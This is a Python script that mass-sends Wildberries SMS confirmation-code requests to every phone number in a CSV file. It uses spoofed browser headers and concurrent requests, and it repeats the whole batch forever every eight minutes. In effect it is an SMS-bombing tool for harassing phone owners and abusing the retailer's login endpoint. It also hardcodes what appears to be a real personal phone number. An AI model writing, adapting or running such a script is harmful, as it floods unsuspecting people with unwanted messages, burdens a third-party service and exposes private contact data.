import aiohttp
import asyncio
import csv
from time import sleep
import copy


url = 'https://www.wildberries.ru/mobile/requestconfirmcode?forAction=EasyLogin'

post_data = []

wildberries_request_data_template = {
        'phoneInput.AgreeToReceiveSmsSpam': 'true',
        'phoneInput.ConfirmCode': '',
        'phoneInput.FullPhoneMobile': '79522803492',
        'returnUrl': 'https%3A%2F%2Fwww.wildberries.ru%2Fservices%2Fprodavayte-na-wildberries',
        'phonemobile': '79522803492',
        'agreeToReceiveSms': 'true',
        'shortSession': 'false',
        'period' : 'ru',
}
    
def set_number(number):
    n = number.replace('+', '').replace('-', '')
    w = copy.deepcopy(wildberries_request_data_template)
    w['phoneInput.FullPhoneMobile'] = n
    w['phonemobile'] = n
    return w

wildberries_headers = {
    "Host": "www.wildberries.ru",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Referer": "https://www.wildberries.ru/security/login?returnUrl=https%3A%2F%2Fwww.wildberries.ru%2Fservices%2Fprodavayte-na-wildberries",
    "Origin": "https://www.wildberries.ru",
    "Connection": "keep-alive",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin"
}

with open('phones.csv') as csv_file:
    csv_reader = csv.reader(csv_file, delimiter=',')
    line_count = 0
    for row in csv_reader:
        if line_count == 0:
            line_count += 1
        else:
            t = row[0]
            if ',' in t:
                t = t.split(',')
            if type(t) == list:
                for i in t:
                    post_data.append(set_number(i))
            else:
                post_data.append(set_number(t))
             

async def post_wildberries(session, files):
    async with session.post(url, data=files, headers=wildberries_headers) as resp:
        w_resp = await resp.json()
        print(f'{files["phonemobile"]} > {w_resp["Value"]}')
        return w_resp["ResultState"]


async def main():
    async with aiohttp.ClientSession() as session:
        tasks = []
        for r in post_data:
            tasks.append(asyncio.ensure_future(post_wildberries(session, r)))
        respo = await asyncio.gather(*tasks)


while True:
    try:
        asyncio.run(main())
    except Exception as e:
        print('Exception: {e}')
        
    sleep(480000 / 1000)
